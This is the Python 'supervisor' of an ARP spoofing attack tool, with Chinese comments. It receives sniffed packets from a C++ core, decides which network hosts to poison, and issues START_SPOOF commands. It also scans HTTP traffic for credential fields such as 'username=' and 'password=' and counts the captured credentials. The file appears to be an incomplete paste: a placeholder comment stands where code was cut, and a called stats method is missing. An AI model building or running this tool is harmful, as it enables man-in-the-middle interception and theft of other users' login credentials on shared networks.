#!/usr/bin/env python3
"""
ARP Spoofer Python Supervisor v2.0
===================================
职责：
1. 从C++核心接收网络数据包
2. 分析数据包并做出攻击决策
3. 管理目标状态（TTL缓存）
4. 向C++核心下发攻击指令
5. 提供Web API和监控接口
"""

import zmq
import json
import time
import threading
import logging
import argparse
import signal
import sys
import hashlib  # ★【新增】★ 用于计算数据包指纹
from concurrent.futures import ThreadPoolExecutor
from cachetools import TTLCache  # ★【新增】★ 用于去重缓存
from dataclasses import dataclass
from typing import Optional, Dict, Set
from datetime import datetime, timedelta

from state_cache import StateCache
from packet_analyzer import PacketAnalyzer
from attack_coordinator import AttackCoordinator
from web_api import WebAPI
from config import Config

class PythonSupervisor:
    """Python监督者主类"""
    
    def __init__(self, config: Config):
        self.config = config
        self.running = False
        
        # ZMQ上下文和套接字
        self.context = zmq.Context()
        self.packet_receiver = None
        self.command_sender = None
        
        # 核心组件
        self.state_cache = StateCache()
        self.packet_analyzer = PacketAnalyzer(config)
        self.attack_coordinator = AttackCoordinator(config, self.state_cache)
        self.web_api = WebAPI(self.state_cache, config)
        
        # ★【新增】★ 心跳机制
        self.last_ping_time = time.time()
        self.heartbeat_thread = None
        self.heartbeat_running = False
        
        # 线程池
        self.thread_pool = ThreadPoolExecutor(
            max_workers=config.max_worker_threads,
            thread_name_prefix="PacketWorker"
        )
        
        # 统计信息
        self.stats = {
            'start_time': time.time(),
            'packets_received': 0,
            'packets_processed': 0,
            'commands_sent': 0,
            'attacks_launched': 0,
            'credentials_captured': 0
        }
        
        # ★★★【新增】★★★ 入口去重缓存 
        # 缓存最近500个数据包的哈希值，有效期3秒
        # 这意味着3秒内到达的完全相同的数据包将被视为重复
        # 这些值可以根据实际网络情况调整
        self.recent_packets_cache = TTLCache(maxsize=500, ttl=3)
        self.cache_lock = threading.Lock()  # 用于保护缓存的线程安全
        
        # ★【强化去重】★ HTTP凭据级别的去重缓存
        self.http_credentials_cache = TTLCache(maxsize=200, ttl=10)  # HTTP凭据去重，10秒TTL
        self.http_cache_lock = threading.Lock()
        
        # 设置日志
        self._setup_logging()
        
    def _setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format='[%(asctime)s] [%(threadName)-20s] [%(levelname)-8s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            handlers=[
                logging.FileHandler(self.config.log_file, mode='a'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        """初始化监督者"""
        try:
            self.logger.info("Initializing Python Supervisor...")
            
            # 初始化ZMQ套接字
            if not self._init_zmq():
                return False
                
            # 初始化各个组件
            if not self.attack_coordinator.initialize(self._send_command):
                self.logger.error("Failed to initialize attack coordinator")
                return False
                
            # 启动Web API（如果启用）
            if self.config.enable_web_api:
                self.web_api.start(self.config.web_api_port)
                
            self.logger.info("Python Supervisor initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize supervisor: {e}")
            return False
            
    def _init_zmq(self) -> bool:
        """初始化ZMQ通信"""
        try:
            # 接收数据包的套接字（PULL模式）
            self.packet_receiver = self.context.socket(zmq.PULL)
            self.packet_receiver.bind(self.config.packet_ipc_address)
            self.packet_receiver.setsockopt(zmq.RCVTIMEO, 1000)  # 1秒超时
            
            # 发送命令的套接字（PUSH模式）
            self.command_sender = self.context.socket(zmq.PUSH)
            self.command_sender.bind(self.config.command_ipc_address)
            self.command_sender.setsockopt(zmq.SNDTIMEO, 1000)  # 1秒超时
            
            self.logger.info(f"ZMQ sockets initialized:")
            self.logger.info(f"  - Packet receiver: {self.config.packet_ipc_address}")
            self.logger.info(f"  - Command sender: {self.config.command_ipc_address}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize ZMQ: {e}")
            return False
            
    def run(self):
        """运行主循环"""
        self.running = True
        self.logger.info("Starting main supervisor loop...")
        
        # ★【新增】★ 启动心跳机制
        self.start_heartbeat()
        
        try:
            while self.running:
                try:
                    # 1. 接收原始二进制数据
                    raw_data = self.packet_receiver.recv(zmq.NOBLOCK)
                    self.stats['packets_received'] += 1
                    
                    # ★★★【性能优化】★★★ 快速预过滤 - 在主线程中进行
                    # 2. 解码并进行快速JSON有效性检查
                    try:
                        packet_data = raw_data.decode('utf-8')
                        packet_info = json.loads(packet_data)  # 快速解析检查
                    except (UnicodeDecodeError, json.JSONDecodeError):
                        # 无效数据，直接丢弃
                        continue
                    
                    # 3. ★【性能关键】★ 快速预过滤：检查是否值得处理
                    if not self._is_packet_worth_processing(packet_info):
                        continue
                    
                    # 4. ★★★【核心优化】★★★ 在提交到线程池前进行去重
                    # 计算数据包的哈希值作为唯一"指纹"
                    payload_hash = hashlib.sha1(raw_data).hexdigest()
                    
                    # 检查指纹是否存在于近期缓存中
                    with self.cache_lock:
                        if hasattr(self, 'recent_packets_cache') and self.recent_packets_cache is not None:
                            if payload_hash in self.recent_packets_cache:
                                # 如果存在，说明是重复包，直接丢弃
                                continue
                            else:
                                # 如果是新包，将其指纹存入缓存
                                self.recent_packets_cache[payload_hash] = True
                        else:
                            # 容错：初始化缓存
                            try:
                                from cachetools import TTLCache
                                self.recent_packets_cache = TTLCache(maxsize=500, ttl=3)
                                self.recent_packets_cache[payload_hash] = True
                                self.logger.warning("🔧 Re-initialized packet deduplication cache")
                            except ImportError:
                                # 如果TTLCache不可用，使用简单字典
                                self.recent_packets_cache = {}
                                self.recent_packets_cache[payload_hash] = True
                                self.logger.warning("🔧 Using simple dict for packet deduplication (TTLCache not available)")
                    
                    # 5. ★【强化HTTP去重】★ 针对包含凭据的HTTP包进行额外去重
                    if packet_info.get('type') == 2 and self._has_potential_credentials(packet_info):  # HTTP包
                        src_ip = packet_info.get('src_ip', '')
                        payload = packet_info.get('payload', '')
                        
                        # 构建HTTP凭据指纹（基于IP和载荷特征）
                        cred_fingerprint = f"{src_ip}:{hashlib.md5(payload.encode()).hexdigest()[:8]}"
                        
                        with self.http_cache_lock:
                            if hasattr(self, 'http_credentials_cache') and self.http_credentials_cache is not None:
                                if cred_fingerprint in self.http_credentials_cache:
                                    continue  # 跳过重复的HTTP凭据包
                                else:
                                    self.http_credentials_cache[cred_fingerprint] = True
                            else:
                                # 容错：初始化HTTP凭据缓存
                                try:
                                    from cachetools import TTLCache
                                    self.http_credentials_cache = TTLCache(maxsize=200, ttl=10)
                                    self.http_credentials_cache[cred_fingerprint] = True
                                    self.logger.warning("🔧 Re-initialized HTTP credentials deduplication cache")
                                except ImportError:
                                    self.http_credentials_cache = {}
                                    self.http_credentials_cache[cred_fingerprint] = True
                                    self.logger.warning("🔧 Using simple dict for HTTP deduplication")
                    
                    # 6. ★【新增】★ 检查是否为心跳PING（在主线程中快速处理）
                    if packet_info.get('type') == 'PING':
                        self._handle_ping(packet_info)
                        continue
                    
                    # 7. ★ 只有经过所有过滤的高价值数据包才提交给线程池处理
                    self.thread_pool.submit(self._process_packet, packet_data)
                    
                except zmq.Again:
                    # 没有数据包，短暂休眠
                    time.sleep(0.001)
                    continue
                    
                except Exception as e:
                    self.logger.error(f"Error in main loop: {e}")
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            self.logger.info("Received interrupt signal")
        finally:
            self._shutdown()
            
    def _process_packet(self, packet_data: str):
        """处理单个数据包"""
        try:
            # 解析数据包
            packet_info = json.loads(packet_data)
            self.stats['packets_processed'] += 1
            
            # 分析数据包
            analysis_result = self.packet_analyzer.analyze(packet_info)
            
            if analysis_result:
                # 根据分析结果做出决策
                decision = self.attack_coordinator.make_decision(analysis_result)
                
                if decision:
                    self._execute_decision(decision)
                    
        except Exception as e:
            self.logger.error(f"Error processing packet: {e}")
            
    def _execute_decision(self, decision):
        """执行攻击决策"""
        try:
            if decision.action == 'attack':
                attack_log = f"Launching {decision.attack_type} attack on {decision.target_ip} for {decision.duration}s"
                self.logger.info(attack_log)
                self.stats['attacks_launched'] += 1
                
                # 发送攻击命令给C++核心
                command = {
                    'type': 'START_SPOOF',
                    'target_ip': decision.target_ip,
                    'gateway_ip': decision.gateway_ip,
                    'target_mac': decision.target_mac,
                    'gateway_mac': decision.gateway_mac,
                    'duration': decision.duration,
                    'attack_type': decision.attack_type,  # ★【新增】★ 攻击类型
                    'reason': decision.reason
                }
                
                self._send_command(command)
                
            elif decision.action == 'restore':
                self.logger.info(f"Restoring ARP for {decision.target_ip}")
                
                command = {
                    'type': 'RESTORE_ARP',
                    'target_ip': decision.target_ip,
                    'gateway_ip': decision.gateway_ip,
                    'target_mac': decision.target_mac,
                    'gateway_mac': decision.gateway_mac
                }
                
                self._send_command(command)
                
        except Exception as e:
            self.logger.error(f"Error executing decision: {e}")
            
    def _send_command(self, command: dict):
        """发送命令给C++核心"""
        try:
            command_json = json.dumps(command)
            self.command_sender.send_string(command_json, zmq.NOBLOCK)
            self.stats['commands_sent'] += 1
            
        except zmq.Again:
            self.logger.warning("Command send timeout")
        except Exception as e:
            self.logger.error(f"Error sending command: {e}")
            
    # ★【新增】★ 心跳机制方法
    def start_heartbeat(self):
        """启动心跳监听线程"""
        if self.heartbeat_running:
            return
            
        self.heartbeat_running = True
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()
        self.logger.info("Heartbeat mechanism started")
    
    def stop_heartbeat(self):
        """停止心跳机制"""
        self.heartbeat_running = False
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.heartbeat_thread.join(timeout=1.0)
        self.logger.info("Heartbeat mechanism stopped")
    
    def _heartbeat_loop(self):
        """心跳监听循环"""
        while self.heartbeat_running and self.running:
            try:
                # 检查是否收到PING，如果是则回复PONG
                current_time = time.time()
                
                # 每5秒检查一次连接状态
                if current_time - self.last_ping_time > 20:  # 20秒没收到ping
                    self.logger.warning("⚠️  No heartbeat from C++ core for 20+ seconds")
                
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(f"Heartbeat loop error: {e}")
                time.sleep(1)
    
    def _handle_ping(self, ping_data):
        """处理心跳PING并回复PONG"""
        try:
            self.last_ping_time = time.time()
            
            # 构造PONG响应
            pong_command = {
                'type': 'PONG',
                'timestamp': int(time.time() * 1000),  # 毫秒时间戳
                'status': 'healthy'
            }
            
            # 发送PONG
            self._send_command(pong_command)
            
        except Exception as e:
            self.logger.error(f"Failed to handle ping: {e}")
            
    def _shutdown(self):
        """清理资源 - 强化版本"""
        self.logger.info("🛑 Starting supervisor shutdown sequence...")
        self.running = False
        
        # ★【新增】★ 发送关闭信号给C++核心
        try:
            shutdown_command = {
                'type': 'SHUTDOWN',
                'timestamp': int(time.time() * 1000),
                'reason': 'supervisor_shutdown'
            }
            self._send_command(shutdown_command)
            self.logger.info("📤 Shutdown signal sent to C++ core")
            time.sleep(0.5)  # 给C++时间处理关闭信号
        except Exception as e:
            self.logger.warning(f"Failed to send shutdown signal: {e}")
        
        # 停止心跳线程
        if hasattr(self, 'heartbeat_thread') and self.heartbeat_thread:
            self.heartbeat_running = False
            try:
                self.heartbeat_thread.join(timeout=2.0)
                self.logger.info("❤️ Heartbeat thread stopped")
            except Exception as e:
                self.logger.warning(f"Heartbeat thread cleanup error: {e}")
        
        # 停止线程池 - 兼容不同Python版本
        if self.thread_pool:
            self.logger.info("🧵 Shutting down thread pool...")
            try:
                # Python 3.9+ 支持timeout参数
                self.thread_pool.shutdown(wait=True, timeout=5.0)
                self.logger.info("🧵 Thread pool shutdown complete")
            except TypeError:
                # Python 3.8及以下版本
                self.thread_pool.shutdown(wait=True)
                self.logger.info("🧵 Thread pool shutdown complete (legacy)")
            except Exception as e:
                self.logger.error(f"Thread pool shutdown error: {e}")
            
        # 停止Web API
        if self.config.enable_web_api:
            try:
                self.web_api.stop()
                self.logger.info("🌐 Web API stopped")
            except Exception as e:
                self.logger.warning(f"Web API stop error: {e}")
            
        # ★【新增】★ 清理缓存
        try:
            with self.cache_lock:
                if hasattr(self, 'recent_packets_cache'):
                    self.recent_packets_cache.clear()
            with self.http_cache_lock:
                if hasattr(self, 'http_credentials_cache'):
                    self.http_credentials_cache.clear()
            self.logger.info("🧹 Caches cleared")
        except Exception as e:
            self.logger.warning(f"Cache cleanup error: {e}")
            
        # 关闭ZMQ套接字
        try:
            if self.packet_receiver:
                self.packet_receiver.close()
                self.logger.info("📥 Packet receiver socket closed")
            if self.command_sender:
                self.command_sender.close()
                self.logger.info("📤 Command sender socket closed")
        except Exception as e:
            self.logger.warning(f"ZMQ socket cleanup error: {e}")
            
        # 销毁ZMQ上下文
        try:
            self.context.term()
            self.logger.info("🔌 ZMQ context terminated")
        except Exception as e:
            self.logger.warning(f"ZMQ context cleanup error: {e}")
        
        # 打印统计信息
        self._print_final_stats()
    
    def _is_packet_worth_processing(self, packet_info: dict) -> bool:
        """快速预过滤：判断数据包是否值得进一步处理"""
        try:
            packet_type = packet_info.get('type')
            
            # 过滤未知类型的包
            if packet_type not in [1, 2]:  # 1=ARP, 2=HTTP
                return False
            
            # 对于ARP包，快速检查源IP是否有效
            if packet_type == 1:
                src_ip = packet_info.get('src_ip', '')
                if not src_ip or src_ip in {'0.0.0.0', '255.255.255.255', '127.0.0.1'}:
                    return False
                
                # 检查是否为ARP请求
                if packet_info.get('arp_opcode', 0) != 1:
                    return False
            
            # 对于HTTP包，快速检查是否可能包含凭据
            elif packet_type == 2:
                src_ip = packet_info.get('src_ip', '')
                if not src_ip or src_ip in {'0.0.0.0', '255.255.255.255', '127.0.0.1'}:
                    return False
                
                # 快速检查端口是否为高价值端口
                dst_port = packet_info.get('dst_port', 0)
                if dst_port not in self.config.network.high_value_ports:
                    # 对于非高价值端口，检查是否可能包含凭据
                    if not self._has_potential_credentials(packet_info):
                        return False
            
            return True
            
        except Exception as e:
            self.logger.debug(f"Pre-filter error: {e}")
            return True  # 出错时保守处理，允许通过
    
    def _has_potential_credentials(self, packet_info: dict) -> bool:
        """快速检查HTTP包是否可能包含凭据（避免深度正则表达式分析）"""
        try:
            payload = packet_info.get('payload', '').lower()
            
            # 快速字符串搜索，避免复杂正则
            credential_indicators = [
                'username=', 'password=', 'user=', 'pwd=', 'pass=',
                'login=', 'account=', 'user_account=', 'user_password=',
                '"username":', '"password":', 'loginname=', 'passwd='
            ]
            
            return any(indicator in payload for indicator in credential_indicators)
            
        except Exception:
            return True  # 出错时保守处理
    
    # ...existing code...
def parse_arguments():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description="ARP Spoofer Python Supervisor")
    parser.add_argument('-c', '--config', default='config.yaml',
                       help='Configuration file path')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO', help='Log level')
    parser.add_argument('--web-api', action='store_true',
                       help='Enable web API interface')
    parser.add_argument('--web-port', type=int, default=8080,
                       help='Web API port')
    
    return parser.parse_args()

def signal_handler(signum, frame):
    """信号处理器"""
    print(f"\nReceived signal {signum}, shutting down...")
    sys.exit(0)

def main():
    """主函数"""
    # 解析命令行参数
    args = parse_arguments()
    
    # 设置信号处理
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        # 加载配置
        config = Config.load_from_file(args.config)
        
        # 命令行参数覆盖配置文件
        if args.log_level:
            config.log_level = args.log_level
        if args.web_api:
            config.enable_web_api = True
        if args.web_port:
            config.web_api_port = args.web_port
            
        # 创建并运行监督者
        supervisor = PythonSupervisor(config)
        
        if supervisor.initialize():
            supervisor.run()
        else:
            print("Failed to initialize supervisor")
            sys.exit(1)
            
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
